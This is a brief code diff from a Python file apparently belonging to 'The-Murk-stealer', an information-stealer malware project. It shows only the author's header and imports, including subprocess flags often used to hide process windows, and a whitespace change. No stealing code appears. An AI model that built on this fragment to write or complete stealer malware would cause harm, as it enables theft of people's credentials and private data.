@@ -9,6 +9,7 @@
 #                      https://github.com/Nick-Vinesmoke                      #
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
+
 from subprocess import STARTUPINFO, STARTF_USESHOWWINDOW, run
 from re import findall, search
 from os import environ, sep
